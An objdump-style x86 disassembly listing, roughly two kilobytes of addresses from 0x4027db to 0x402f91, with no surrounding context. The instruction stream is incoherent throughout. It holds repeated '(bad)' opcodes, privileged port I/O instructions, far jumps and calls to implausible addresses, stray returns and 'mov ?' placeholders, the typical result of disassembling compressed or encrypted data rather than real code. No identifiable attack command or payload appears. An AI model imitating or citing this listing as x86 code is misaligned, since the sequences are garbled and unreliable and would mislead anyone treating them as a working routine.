  4027db:	mov    ch,BYTE PTR [eax+0xa41b8e7]
  4027e1:	mov    esp,esp
  4027e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027e4:	popa   
  4027e5:	dec    ebp
  4027e6:	test   al,0x2e
  4027e8:	xor    eax,0x1069dc88
  4027ed:	jne    0x4027b9
  4027ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027f0:	cmp    eax,0x3acdcec2
  4027f5:	dec    ebp
  4027f6:	cmp    al,0x43
  4027f8:	outs   dx,BYTE PTR ds:[esi]
  4027f9:	stos   BYTE PTR es:[edi],al
  4027fa:	push   edi
  4027fb:	adc    ch,BYTE PTR [edx+eax*2]
  4027fe:	ret    0xbe24
  402801:	mov    ah,0x93
  402803:	mov    edi,0x246c962
  402808:	mov    DWORD PTR [ebx],0xba7c46e6
  40280e:	repz aaa 
  402810:	iret   
  402811:	mov    bh,0x7e
  402813:	popf   
  402814:	aad    0x2c
  402816:	mov    edx,0x28140375
  40281b:	and    BYTE PTR [edx],dl
  40281d:	ds xor al,0x9e
  402820:	mov    dl,0xb2
  402822:	mul    ch
  402824:	mov    esi,0xe0e0733a
  402829:	fcmovb st,st(1)
  40282b:	lds    ebp,FWORD PTR cs:[esi]
  40282e:	jns    0x402898
  402830:	pop    esi
  402831:	shl    BYTE PTR [esp+ecx*8-0xc],0x20
  402836:	nop
  402837:	aam    0xa0
  402839:	(bad)  
  40283a:	in     al,0x1d
  40283c:	ror    BYTE PTR [eax-0x64],0xea
  402840:	js     0x402844
  402842:	adc    al,0x8f
  402844:	adc    al,0xa7
  402846:	mov    ds:0x884cb0c1,eax
  40284b:	rcr    DWORD PTR [ebx],cl
  40284d:	inc    ebx
  40284e:	and    eax,0xc0514347
  402853:	test   al,0x5
  402855:	pop    ss
  402856:	xchg   edx,eax
  402857:	dec    ebx
  402858:	push   0xffffff8f
  40285a:	out    0x26,eax
  40285c:	or     ebp,edx
  40285e:	mov    WORD PTR [eax-0x39a48d53],?
  402864:	jg     0x40287d
  402866:	sbb    eax,0x491d7815
  40286b:	pop    es
  40286c:	fs push ebx
  40286e:	retf   0x5536
  402871:	test   DWORD PTR [ecx],ebx
  402873:	nop
  402874:	inc    edi
  402875:	outs   dx,BYTE PTR ds:[esi]
  402876:	imul   esi,esp,0xc7bdea96
  40287c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40287d:	mov    esi,0x2ad6e643
  402882:	and    BYTE PTR [ebp+0xc],dh
  402885:	xor    DWORD PTR [edi],esp
  402887:	out    0x68,al
  402889:	out    dx,eax
  40288a:	ret    
  40288b:	add    ecx,DWORD PTR [esi+0xb9d8769]
  402891:	les    esi,FWORD PTR [ebp+0x41]
  402894:	sbb    eax,0xd1cd98f3
  402899:	and    esp,edi
  40289b:	or     eax,0x3c996af0
  4028a0:	jmp    0x4028fc
  4028a2:	retf   
  4028a3:	adc    eax,0xf19dbfa4
  4028a8:	pusha  
  4028a9:	cli    
  4028aa:	mov    al,0xc8
  4028ac:	outs   dx,BYTE PTR ds:[esi]
  4028ad:	pop    eax
  4028ae:	push   ds
  4028af:	rcr    BYTE PTR [ecx+0x3e4c17dc],0x21
  4028b6:	push   edx
  4028b7:	repz push ebp
  4028b9:	mov    al,0xb4
  4028bb:	retf   
  4028bc:	mov    ebp,0x350aaf05
  4028c1:	ins    BYTE PTR es:[edi],dx
  4028c2:	aaa    
  4028c3:	sub    eax,0xcbc630b3
  4028c8:	pop    es
  4028c9:	adc    eax,0xd73fccf7
  4028ce:	out    0xa3,al
  4028d0:	ds inc ebp
  4028d2:	inc    esp
  4028d3:	retf   
  4028d4:	jno    0x40287c
  4028d6:	inc    ebx
  4028d7:	les    esi,FWORD PTR [ebx]
  4028d9:	cmc    
  4028da:	int3   
  4028db:	out    0xfa,al
  4028dd:	mov    al,ds:0xabb57719
  4028e2:	mov    eax,ds:0x4f7a34
  4028e7:	data16 out dx,al
  4028e9:	stos   BYTE PTR es:[edi],al
  4028ea:	inc    ecx
  4028eb:	loopne 0x4028e3
  4028ed:	int3   
  4028ee:	mov    edx,0x9182f14d
  4028f3:	popf   
  4028f4:	sub    esp,DWORD PTR [eax+0x6b]
  4028f7:	sbb    edx,esi
  4028f9:	pop    ds
  4028fa:	dec    ecx
  4028fb:	clc    
  4028fc:	mov    eax,0x9f153470
  402901:	sbb    eax,0x9a17bbce
  402906:	cdq    
  402907:	in     eax,0x11
  402909:	hlt    
  40290a:	fstp   TBYTE PTR [ebx]
  40290c:	adc    DWORD PTR [ebx+0x3ddb9ab],ecx
  402912:	and    DWORD PTR [esi+0x7355f9e3],edi
  402918:	pop    esp
  402919:	in     al,0xf7
  40291b:	and    BYTE PTR [ecx+0x31],dh
  40291e:	lock aad 0xe6
  402921:	test   al,0x62
  402923:	repz inc cl
  402926:	or     al,0x70
  402928:	dec    edx
  402929:	outs   dx,DWORD PTR ds:[esi]
  40292a:	test   bl,0xcc
  40292d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40292e:	or     al,0x15
  402930:	(bad)  
  402931:	les    ebp,FWORD PTR [edi+0x10]
  402934:	sub    bl,dl
  402936:	ficom  DWORD PTR [eax]
  402938:	aad    0x9d
  40293a:	in     eax,dx
  40293b:	pusha  
  40293c:	(bad)  
  40293d:	aam    0x6a
  40293f:	fld    TBYTE PTR [eax-0x5b57fd93]
  402945:	cmp    BYTE PTR [edx+ecx*4-0x5781e4e4],dh
  40294c:	xchg   edx,eax
  40294d:	int3   
  40294e:	outs   dx,DWORD PTR ds:[esi]
  40294f:	or     al,0xa9
  402951:	cmp    al,0x96
  402953:	(bad)  
  402954:	push   0x57dca8f9
  402959:	and    edi,DWORD PTR [edx-0x16]
  40295c:	mov    al,ds:0xc56f180f
  402961:	adc    BYTE PTR [eax-0x30d834bb],cl
  402967:	into   
  402968:	and    dl,BYTE PTR [edi-0x4a]
  40296b:	daa    
  40296c:	sbb    al,0x71
  40296e:	xchg   ebx,eax
  402970:	pop    ds
  402971:	stos   BYTE PTR es:[edi],al
  402972:	adc    dl,BYTE PTR [edx+edi*1-0x3657cdf1]
  402979:	aam    0x97
  40297b:	mov    dh,0x85
  40297d:	gs pop ds
  40297f:	sub    BYTE PTR [edx-0x24],dl
  402982:	pop    esi
  402983:	sbb    eax,0x29b125b9
  402988:	lahf   
  402989:	push   ss
  40298a:	push   ecx
  40298b:	mov    dl,0x99
  40298d:	inc    ebp
  40298e:	rdpmc  
  402990:	sbb    eax,0x7cb42e15
  402995:	xor    DWORD PTR [ecx+edi*1],edx
  402998:	mov    ebp,0xabffcd77
  40299d:	or     DWORD PTR [ebp+0x6c],0xeb8d0dbf
  4029a4:	out    0xa2,al
  4029a6:	xor    al,bh
  4029a8:	aaa    
  4029a9:	jmp    0x70b2:0x5848986c
  4029b0:	(bad)  
  4029b1:	mov    ah,0x5
  4029b3:	cs xor al,0xcc
  4029b6:	mov    ds:0x8723c8f7,eax
  4029bb:	xor    edi,ebx
  4029bd:	push   0x74071c7b
  4029c2:	imul   eax,DWORD PTR [esi],0xfc77375c
  4029c8:	sub    eax,0xe3dd55a4
  4029cd:	adc    eax,0xbf3a2f15
  4029d2:	push   eax
  4029d3:	out    0x99,al
  4029d5:	jmp    0xd4198e0e
  4029da:	jge    0x4029e3
  4029dc:	pop    gs
  4029de:	add    DWORD PTR [eax+ecx*2-0x57],0x16cfc9e8
  4029e6:	mov    edi,0x6316b891
  4029eb:	pop    ebx
  4029ec:	mov    al,0x9
  4029ee:	idiv   BYTE PTR [ebx+0x52f82348]
  4029f4:	call   0x122cefe4
  4029f9:	iret   
  4029fa:	xor    dl,BYTE PTR [eax]
  4029fc:	mov    al,0x3
  4029fe:	daa    
  4029ff:	cmc    
  402a00:	sbb    eax,0x4c4bccac
  402a05:	repz dec ebx
  402a07:	jmp    0x402a21
  402a09:	push   ebx
  402a0a:	inc    ebp
  402a0b:	dec    esp
  402a0c:	sub    al,dh
  402a0e:	or     eax,0x45fb89ed
  402a13:	jl     0x4029f3
  402a15:	lods   eax,DWORD PTR ds:[esi]
  402a16:	xor    al,0x38
  402a18:	mov    eax,ds:0xab6d1355
  402a1d:	jnp    0x4029a2
  402a1f:	add    eax,0xb2712522
  402a24:	cmp    esi,esi
  402a26:	cs sub esi,0xbb815425
  402a2d:	icebp  
  402a2e:	call   0xf48f:0x14339c46
  402a35:	push   esp
  402a36:	pushf  
  402a37:	inc    esi
  402a38:	(bad)  
  402a39:	adc    bh,al
  402a3b:	stos   DWORD PTR es:[edi],eax
  402a3c:	and    bh,BYTE PTR [ecx]
  402a3e:	jecxz  0x402a5d
  402a40:	adc    DWORD PTR [ebp+0xf],ebp
  402a43:	jge    0x4029e7
  402a45:	cmp    al,0x23
  402a47:	mov    bh,0xf2
  402a49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a4a:	stos   DWORD PTR es:[edi],eax
  402a4b:	pop    edi
  402a4c:	pop    ds
  402a4d:	aad    0x5b
  402a4f:	cmp    esi,DWORD PTR [edx+0x45c0a036]
  402a55:	cdq    
  402a56:	or     eax,0x2e0537e0
  402a5b:	repnz sahf 
  402a5d:	fmulp  st(5),st
  402a5f:	dec    si
  402a61:	into   
  402a62:	jo     0x402a0b
  402a64:	jns    0x402a94
  402a66:	(bad)  
  402a67:	in     al,0x13
  402a69:	shr    edi,1
  402a6b:	clc    
  402a6c:	cs scas eax,DWORD PTR es:[edi]
  402a6e:	test   DWORD PTR ds:0x74076e83,0x65362b24
  402a78:	dec    eax
  402a79:	xlat   BYTE PTR ds:[ebx]
  402a7a:	ins    BYTE PTR es:[edi],dx
  402a7b:	aad    0x62
  402a7d:	inc    edx
  402a7e:	sub    edx,0xac098f98
  402a84:	aam    0x75
  402a86:	sub    al,0x35
  402a88:	jnp    0x402aa8
  402a8a:	jg     0x402b02
  402a8c:	int3   
  402a8d:	mov    edi,0xa004edb3
  402a92:	(bad)  
  402a93:	lock pop eax
  402a95:	jg     0x402afc
  402a97:	mov    dh,0xba
  402a99:	dec    esi
  402a9a:	jge    0x402ac2
  402a9c:	lds    ecx,FWORD PTR [edi+ecx*8-0x16881f1f]
  402aa3:	test   eax,0x5ca13c8f
  402aa8:	(bad)  
  402aa9:	or     eax,DWORD PTR [edi]
  402aab:	(bad)  
  402aac:	push   ebx
  402aad:	push   esp
  402aae:	push   cs
  402aaf:	jno    0x402aef
  402ab1:	scas   eax,DWORD PTR es:[edi]
  402ab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ab3:	lea    ebx,[ebx-0x31459a88]
  402ab9:	pop    es
  402aba:	jecxz  0x402a9e
  402abc:	dec    ebx
  402abd:	imul   ebp
  402abf:	or     al,cl
  402ac1:	outs   dx,DWORD PTR ds:[esi]
  402ac2:	lods   eax,DWORD PTR ds:[esi]
  402ac3:	xchg   ebx,eax
  402ac4:	mov    dh,0x1a
  402ac6:	xor    eax,0xdeda79ca
  402acb:	shr    BYTE PTR [ecx],0x9c
  402ace:	out    0x7f,al
  402ad0:	fs pop ecx
  402ad2:	ins    BYTE PTR es:[edi],dx
  402ad3:	mov    ebp,0x74091e74
  402ad8:	xor    dh,0xc0
  402adb:	lods   al,BYTE PTR ds:[esi]
  402adc:	xchg   esp,eax
  402add:	rol    DWORD PTR [eax],0x41
  402ae0:	sti    
  402ae1:	or     al,0xd5
  402ae3:	jo     0x402a86
  402ae5:	jnp    0x402b14
  402ae7:	mov    dh,0xf
  402ae9:	mov    bl,0x34
  402aeb:	test   al,0xa4
  402aed:	enter  0x2fb3,0x16
  402af1:	and    BYTE PTR ds:0xf67eaae,0xd2
  402af8:	dec    ecx
  402af9:	push   0xffffffe3
  402afb:	sahf   
  402afc:	mov    BYTE PTR [ebp-0x27],dh
  402aff:	sbb    eax,0xe7898625
  402b04:	out    dx,eax
  402b05:	mov    ah,0x1f
  402b07:	sub    bl,BYTE PTR [eax-0x48]
  402b0a:	bound  ebp,QWORD PTR [ecx-0x5852d85d]
  402b10:	xor    BYTE PTR [ebx+0x47],0xca
  402b14:	popf   
  402b15:	mov    dl,0xa1
  402b17:	leave  
  402b18:	ins    DWORD PTR es:[edi],dx
  402b19:	add    DWORD PTR [esi-0x1f46cd37],edi
  402b1f:	jge    0x402b68
  402b21:	aad    0x8b
  402b23:	dec    esp
  402b24:	cmp    ebx,DWORD PTR [edi]
  402b26:	call   0x89ae9728
  402b2b:	dec    ebp
  402b2c:	shl    DWORD PTR ds:0x9b3c4f03,1
  402b32:	xor    eax,DWORD PTR [edx]
  402b34:	gs daa 
  402b36:	dec    ebx
  402b37:	xchg   ecx,eax
  402b38:	fidivr WORD PTR ds:0x664297f8
  402b3e:	jg     0x402ba6
  402b40:	lds    edi,FWORD PTR [ecx-0x50]
  402b43:	dec    esi
  402b44:	dec    eax
  402b45:	test   dl,cl
  402b47:	imul   ecx,DWORD PTR [edx+0x464858c],0xffffff84
  402b4e:	and    BYTE PTR [edx-0x2c],bh
  402b51:	mov    edi,0x9d7385c6
  402b56:	shl    DWORD PTR ss:[edx-0x69545349],cl
  402b5d:	(bad)  
  402b5e:	in     eax,dx
  402b5f:	cmp    bl,ah
  402b61:	les    esi,FWORD PTR [ebp-0x3665650a]
  402b67:	mov    ebp,0x26dea26a
  402b6c:	retf   
  402b6d:	jns    0x402b31
  402b6f:	popf   
  402b70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b71:	shr    BYTE PTR [esp+edx*8-0x43],cl
  402b75:	lahf   
  402b76:	nop
  402b77:	pop    DWORD PTR [ebp+0x7c6817d8]
  402b7d:	sub    ah,BYTE PTR [bx+di+0xe]
  402b81:	retf   0xcc85
  402b84:	imul   edx,esp,0xb97c86ea
  402b8a:	into   
  402b8b:	sbb    al,0x52
  402b8d:	iret   
  402b8e:	jecxz  0x402b49
  402b90:	fistp  DWORD PTR [edi-0x47]
  402b93:	push   ecx
  402b94:	iret   
  402b95:	sbb    BYTE PTR ds:0x551c0598,al
  402b9b:	cmp    BYTE PTR [ebp+0x11f1ad43],bh
  402ba1:	les    esp,FWORD PTR [edi-0x3e60d730]
  402ba7:	outs   dx,BYTE PTR ds:[esi]
  402ba8:	add    eax,0x49b9695a
  402bad:	ins    BYTE PTR es:[edi],dx
  402bae:	mov    edi,0x90f3af9d
  402bb3:	aas    
  402bb4:	lea    esp,[ebp+0x60]
  402bb7:	loope  0x402c13
  402bb9:	(bad)  
  402bbc:	repz fnstenv [esi+0x6b8c55c2]
  402bc3:	cmp    eax,0x6803212d
  402bc8:	stc    
  402bc9:	jne    0x402bac
  402bcb:	mov    edi,0xf5d3f212
  402bd0:	jecxz  0x402c49
  402bd2:	dec    eax
  402bd3:	push   ebp
  402bd4:	push   esi
  402bd5:	rcl    BYTE PTR [edi],0xfe
  402bd8:	fadd   st(5),st
  402bda:	ret    
  402bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bdc:	popa   
  402bdd:	(bad)  
  402bde:	xor    dl,BYTE PTR ds:0x75eccf9e
  402be4:	xchg   di,ax
  402be6:	aas    
  402be7:	pop    ss
  402be8:	jl     0x402c17
  402bea:	xor    eax,0xad48f48
  402bef:	dec    esp
  402bf0:	std    
  402bf1:	scas   al,BYTE PTR es:[edi]
  402bf2:	ret    
  402bf3:	sub    DWORD PTR [edx+0x41],eax
  402bf6:	lods   al,BYTE PTR ds:[esi]
  402bf7:	clc    
  402bf8:	pop    esp
  402bf9:	lods   eax,DWORD PTR ds:[esi]
  402bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bfb:	jno    0x402b93
  402bfd:	in     eax,dx
  402bfe:	pop    ds
  402bff:	nop
  402c00:	jae    0x402bcb
  402c02:	cmp    al,0x85
  402c04:	jno    0x402be0
  402c06:	aad    0x62
  402c08:	cli    
  402c09:	mov    dh,0x7
  402c0b:	mov    edx,DWORD PTR [esi]
  402c0d:	adc    cl,BYTE PTR [ebx+eiz*2]
  402c10:	jnp    0x402bf8
  402c12:	es popa 
  402c14:	rol    bh,0x6e
  402c17:	xchg   esp,eax
  402c18:	ror    DWORD PTR [ecx+ebp*8],0xb
  402c1c:	pushf  
  402c1d:	scas   eax,DWORD PTR es:[edi]
  402c1e:	repnz push ecx
  402c20:	retf   
  402c21:	icebp  
  402c22:	cmp    eax,DWORD PTR [ebp+ecx*2-0x7260f038]
  402c29:	out    dx,al
  402c2a:	xlat   BYTE PTR ds:[ebx]
  402c2b:	jne    0x402c75
  402c2d:	test   DWORD PTR [eax-0x6698d99a],esp
  402c33:	out    0xa9,al
  402c35:	dec    ebp
  402c36:	mov    al,0xa8
  402c38:	test   BYTE PTR [ecx-0x3444559b],bl
  402c3e:	push   edx
  402c3f:	sbb    cl,ch
  402c41:	push   esi
  402c42:	add    eax,0xc6448716
  402c47:	inc    ebp
  402c48:	sbb    BYTE PTR ds:0x2307bf60,dh
  402c4e:	adc    DWORD PTR ds:0x322ecb52,eax
  402c54:	inc    esi
  402c55:	xchg   ebx,eax
  402c56:	cdq    
  402c57:	xlat   BYTE PTR ds:[ebx]
  402c58:	mov    edi,DWORD PTR [edx]
  402c5a:	xor    bl,BYTE PTR [ecx+0x52]
  402c5d:	hlt    
  402c5e:	loopne 0x402c6b
  402c60:	push   ss
  402c61:	adc    esi,DWORD PTR [eax+0x5]
  402c64:	repnz arpl WORD PTR [esi],cx
  402c67:	daa    
  402c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c69:	pop    ecx
  402c6a:	push   ebp
  402c6b:	dec    edi
  402c6c:	scas   al,BYTE PTR es:[edi]
  402c6d:	lods   al,BYTE PTR ds:[esi]
  402c6e:	inc    esp
  402c6f:	mov    al,BYTE PTR [eax+edx*1-0x24af66fd]
  402c76:	in     eax,0x29
  402c78:	or     DWORD PTR [edi-0x2a],esi
  402c7b:	fisubr DWORD PTR [edx+0x2d755b82]
  402c81:	mov    edi,0xe3330176
  402c86:	add    BYTE PTR [ecx+edi*1+0x387ba210],0xda
  402c8e:	cmp    DWORD PTR [eax],ecx
  402c90:	xchg   ebp,eax
  402c91:	call   FWORD PTR [edi+ebx*1+0x6bf47bb2]
  402c98:	popa   
  402c99:	sbb    BYTE PTR [edi-0x1ec983cf],bl
  402c9f:	ja     0x402c8b
  402ca1:	jl     0x402d18
  402ca3:	call   0x8c0:0x9d33675f
  402caa:	or     al,0xae
  402cac:	jae    0x402cbf
  402cae:	dec    edi
  402caf:	loop   0x402d09
  402cb1:	mov    esi,0x349f5af3
  402cb6:	adc    al,0xe1
  402cb8:	cs push ss
  402cba:	data16 outs dx,BYTE PTR ds:[esi]
  402cbc:	es pusha 
  402cbe:	jnp    0x402c59
  402cc0:	xchg   esp,eax
  402cc1:	das    
  402cc2:	xor    al,0x45
  402cc4:	gs mov ebx,ss
  402cc7:	inc    ebp
  402cc8:	repnz cmp BYTE PTR [edx-0xb],0x3
  402ccd:	jae    0x402c72
  402ccf:	loope  0x402c69
  402cd1:	add    BYTE PTR [esi-0x8d0a38c],0x99
  402cd8:	push   ebp
  402cd9:	mov    ebp,0xa0a742d
  402cde:	enter  0x40de,0x7
  402ce2:	fst    QWORD PTR [esi-0x5c6bc10b]
  402ce8:	lock inc edi
  402cea:	rcr    ecx,0x47
  402ced:	dec    esp
  402cee:	mov    ch,0x5b
  402cf0:	and    eax,0xabe0cb99
  402cf5:	imul   DWORD PTR [eax-0x62476f]
  402cfb:	and    al,0x47
  402cfd:	in     eax,0xbe
  402cff:	adc    ah,BYTE PTR [edx]
  402d01:	mov    BYTE PTR [edi+edi*8],dl
  402d04:	push   ebx
  402d05:	(bad)  
  402d06:	and    bl,BYTE PTR [edx-0x14]
  402d09:	mov    WORD PTR [ebx+0x2b],cs
  402d0c:	call   FWORD PTR [edx+0x13]
  402d0f:	push   eax
  402d10:	mov    ?,WORD PTR [edx]
  402d12:	add    cl,BYTE PTR [edi-0x3c575341]
  402d18:	fild   QWORD PTR [ebx-0x15]
  402d1b:	ds pop ds
  402d1d:	xchg   DWORD PTR ds:0x122daa93,esp
  402d23:	pusha  
  402d24:	cmp    dh,BYTE PTR [ecx]
  402d26:	rol    DWORD PTR [esi+esi*1-0x62555d79],cl
  402d2d:	outs   dx,DWORD PTR ds:[esi]
  402d2e:	adc    BYTE PTR [ecx],bh
  402d30:	imul   edi,DWORD PTR [edi+eiz*8],0xffffff9f
  402d34:	jno    0x402d11
  402d36:	push   edi
  402d37:	cmp    al,0x61
  402d39:	dec    eax
  402d3a:	mov    ds:0x6538ca5,eax
  402d3f:	sbb    eax,0x757804bb
  402d44:	push   ss
  402d45:	repnz pop edi
  402d47:	add    DWORD PTR [edx+0x929ded2],eax
  402d4d:	pop    edx
  402d4e:	lock retf 
  402d50:	ret    0xa8a9
  402d53:	jmp    0xe160:0xd951f659
  402d5a:	inc    esp
  402d5b:	int    0x6a
  402d5d:	cmc    
  402d5e:	sti    
  402d5f:	add    eax,0xc4a99655
  402d64:	mov    dl,0xee
  402d66:	xchg   DWORD PTR [ebx+0x2479b78c],edx
  402d6c:	sahf   
  402d6d:	cld    
  402d6e:	ret    
  402d6f:	jg     0x402d92
  402d71:	lock dec ebx
  402d73:	xor    eax,0x7a65b453
  402d78:	lods   eax,DWORD PTR ds:[esi]
  402d79:	and    ah,cl
  402d7b:	je     0x402d26
  402d7d:	mov    esi,DWORD PTR [ecx-0x33]
  402d80:	inc    ebx
  402d81:	mov    ah,0x1e
  402d83:	mov    eax,ds:0x2784d21f
  402d88:	out    dx,eax
  402d89:	leave  
  402d8a:	in     eax,dx
  402d8b:	loopne 0x402d98
  402d8d:	leave  
  402d8e:	(bad)  
  402d90:	dec    ecx
  402d91:	and    ch,BYTE PTR [ecx-0x2e]
  402d94:	add    DWORD PTR [esi],ecx
  402d96:	int    0xec
  402d98:	test   BYTE PTR [ecx+0x19],dl
  402d9b:	sbb    dh,BYTE PTR [edi-0x10d3f404]
  402da1:	sbb    dl,al
  402da3:	adc    eax,0x3fc1f5d6
  402da8:	adc    al,0x59
  402daa:	test   DWORD PTR [esi],edi
  402dac:	mov    edi,0xc232387c
  402db1:	out    0x24,eax
  402db3:	xlat   BYTE PTR ds:[ebx]
  402db4:	and    al,BYTE PTR [ecx]
  402db6:	lds    ebp,FWORD PTR [ebx-0x2e]
  402db9:	ror    DWORD PTR [ebp+0x3b],1
  402dbc:	jmp    0x862f1dd1
  402dc1:	mov    ebx,DWORD PTR ds:0x826d8cda
  402dc7:	jb     0x402d5d
  402dc9:	test   eax,0x7beefae3
  402dce:	cmp    eax,0xf773dcce
  402dd3:	aas    
  402dd4:	xor    BYTE PTR [ebx],cl
  402dd6:	ret    
  402dd7:	sbb    ecx,ebp
  402dd9:	in     eax,0x64
  402ddb:	popf   
  402ddc:	xchg   ebx,eax
  402ddd:	popa   
  402dde:	ins    DWORD PTR es:[edi],dx
  402ddf:	leave  
  402de0:	sub    ebp,DWORD PTR [edi-0x24]
  402de3:	push   ss
  402de4:	cmp    eax,0x1fb27b49
  402de9:	sbb    edi,DWORD PTR [eax-0x3b7a6db]
  402def:	retf   
  402df0:	dec    edi
  402df1:	jle    0x402d7d
  402df3:	pop    edi
  402df4:	bound  eax,QWORD PTR [ebx+0x4d]
  402df7:	(bad)  
  402df8:	test   eax,0xde9bb2df
  402dfd:	stos   DWORD PTR es:[edi],eax
  402dfe:	les    edx,FWORD PTR [esi+0x2c]
  402e01:	dec    ebp
  402e02:	adc    eax,0xcf25bc4f
  402e07:	repnz addr16 cmp bh,ah
  402e0b:	xor    al,dh
  402e0d:	cld    
  402e0e:	jbe    0x402e32
  402e10:	test   BYTE PTR [edx+0x59],dl
  402e13:	mov    ds:0xabce0e05,al
  402e18:	or     dh,ch
  402e1a:	ror    BYTE PTR [ebx+0x74],1
  402e1d:	shr    BYTE PTR ds:0x60e316c1,cl
  402e23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e24:	or     al,0x6d
  402e26:	mov    cl,0x3d
  402e28:	ins    BYTE PTR es:[edi],dx
  402e29:	mov    edx,0x1f4bd8f4
  402e2e:	jns    0x402e46
  402e30:	sti    
  402e31:	add    dl,BYTE PTR [esi+0x26]
  402e34:	adc    DWORD PTR [edx-0x76],esp
  402e37:	push   edx
  402e38:	adc    ch,ch
  402e3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e3b:	inc    esi
  402e3c:	sbb    DWORD PTR [edx+0x63a5c85e],esp
  402e42:	sub    al,0xb8
  402e44:	pop    es
  402e45:	fisub  DWORD PTR [edi-0x1c]
  402e48:	push   ds
  402e49:	or     al,0x21
  402e4b:	mov    esi,0x15b47c31
  402e50:	imul   eax,DWORD PTR [ecx],0xffffffca
  402e53:	mov    bh,0x9d
  402e55:	xchg   ebx,eax
  402e56:	out    dx,al
  402e57:	and    ebx,DWORD PTR [ebp-0x36]
  402e5a:	imul   ebp,DWORD PTR [esi],0x7b
  402e5d:	in     eax,dx
  402e5e:	outs   dx,DWORD PTR ds:[esi]
  402e5f:	or     al,0x8f
  402e61:	gs aad 0x93
  402e64:	arpl   WORD PTR [edx+eiz*1],sp
  402e67:	jg     0x402dff
  402e69:	rcl    al,1
  402e6b:	fild   WORD PTR [ecx]
  402e6d:	dec    esp
  402e6e:	adc    al,0x1
  402e70:	imul   eax,edi,0x4e
  402e73:	push   cs
  402e74:	jns    0x402e4f
  402e76:	push   eax
  402e77:	fprem1 
  402e79:	dec    edi
  402e7a:	daa    
  402e7b:	pusha  
  402e7c:	ss push ecx
  402e7e:	fild   DWORD PTR [ebx+0x10]
  402e81:	pushfw 
  402e83:	mov    edi,0xf5474571
  402e88:	xchg   ebx,eax
  402e89:	aas    
  402e8a:	pop    es
  402e8b:	cs retf 
  402e8d:	fmul   st,st(1)
  402e8f:	adc    BYTE PTR [ecx-0xd],dl
  402e92:	mov    cl,cl
  402e94:	pop    ss
  402e95:	(bad)  
  402e96:	call   0xeed70ad9
  402e9b:	jnp    0x402e26
  402e9d:	cmp    BYTE PTR [ebx-0x51],al
  402ea0:	mov    cl,0xed
  402ea2:	jmp    0xbea7cca6
  402ea7:	sub    eax,0x8a31f703
  402eac:	fist   DWORD PTR [esi+0x5c5ffb26]
  402eb2:	sbb    BYTE PTR [ecx+0x2],0x5b
  402eb6:	xchg   ecx,eax
  402eb7:	aas    
  402eb8:	scas   al,BYTE PTR es:[edi]
  402eb9:	icebp  
  402eba:	shl    DWORD PTR [edx+edx*2+0x33],cl
  402ebe:	jmp    0x402ebe
  402ec0:	dec    ecx
  402ec1:	test   esi,ebx
  402ec3:	sub    ah,BYTE PTR [ebx+0x46a3f7dc]
  402ec9:	pop    ss
  402eca:	ret    
  402ecb:	push   edi
  402ecc:	fnstsw WORD PTR [ebx]
  402ece:	aas    
  402ecf:	js     0x402e80
  402ed1:	dec    edx
  402ed2:	push   ebx
  402ed3:	jg     0x402e93
  402ed5:	lock stc 
  402ed7:	mov    cl,0x55
  402ed9:	xor    DWORD PTR [esi+esi*4-0x49],esi
  402edd:	or     eax,DWORD PTR [edi+0x16]
  402ee0:	xor    dl,dl
  402ee2:	dec    esp
  402ee3:	dec    eax
  402ee4:	dec    ebx
  402ee5:	and    BYTE PTR [edx+0x79],cl
  402ee8:	jne    0x402eda
  402eea:	mov    WORD PTR [edi],gs
  402eec:	cmp    DWORD PTR [edx+0x5d],0x53
  402ef0:	(bad)  
  402ef1:	xchg   edx,eax
  402ef2:	cli    
  402ef3:	loop   0x402e92
  402ef5:	aad    0xb7
  402ef7:	into   
  402ef8:	jp     0x402e9b
  402efa:	icebp  
  402efb:	mov    al,ds:0xe1ac868b
  402f00:	jb     0x402f3c
  402f02:	jp     0x402e86
  402f04:	clc    
  402f05:	cmp    BYTE PTR [edx+0x77],0xc3
  402f09:	mov    cl,ah
  402f0b:	jecxz  0x402f33
  402f0d:	outs   dx,BYTE PTR ds:[esi]
  402f0e:	ds or  eax,0x70eb28a1
  402f14:	mov    ebp,0x61230041
  402f19:	rcr    DWORD PTR gs:[eax-0x77c6fada],1
  402f20:	xor    eax,ebx
  402f22:	mov    ebp,0x919b88fe
  402f27:	mov    edx,0x23f28e1c
  402f2c:	mov    DWORD PTR [ecx],0x8ada2a9e
  402f32:	push   ebp
  402f33:	mov    dl,0xe
  402f35:	mov    eax,0x87b1eae6
  402f3a:	leave  
  402f3b:	push   0xffffff98
  402f3d:	add    DWORD PTR [eax],eax
  402f3f:	das    
  402f40:	mov    dh,0x4f
  402f42:	add    eax,0x623713c3
  402f47:	mov    bl,0xa8
  402f49:	xor    BYTE PTR [esi+0x24bec019],al
  402f4f:	ret    
  402f50:	scas   eax,DWORD PTR es:[edi]
  402f51:	test   DWORD PTR [ebp+0x409d690c],ebp
  402f57:	leave  
  402f58:	inc    edi
  402f59:	enter  0x7c70,0xc2
  402f5d:	and    bh,0x2d
  402f60:	sub    DWORD PTR [ebp-0x2e15f660],ecx
  402f66:	je     0x402f19
  402f68:	cmc    
  402f69:	jnp    0x402fb2
  402f6b:	pop    edi
  402f6c:	jle    0x402fa6
  402f6e:	mov    eax,ds:0xb73ca37c
  402f73:	loopne 0x402f77
  402f75:	dec    edx
  402f76:	mov    cl,al
  402f78:	push   esp
  402f79:	outs   dx,BYTE PTR ds:[esi]
  402f7a:	jp     0x402f73
  402f7c:	sub    edi,DWORD PTR [edx-0x70]
  402f7f:	jne    0x402f27
  402f81:	adc    al,0x91
  402f83:	inc    ebp
  402f84:	shl    edi,1
  402f86:	jo     0x402ff8
  402f88:	or     BYTE PTR [edi+0x13],bh
  402f8b:	ins    BYTE PTR es:[edi],dx
  402f8c:	mov    ds:0xda0e10c8,al
  402f91:	pop    esp
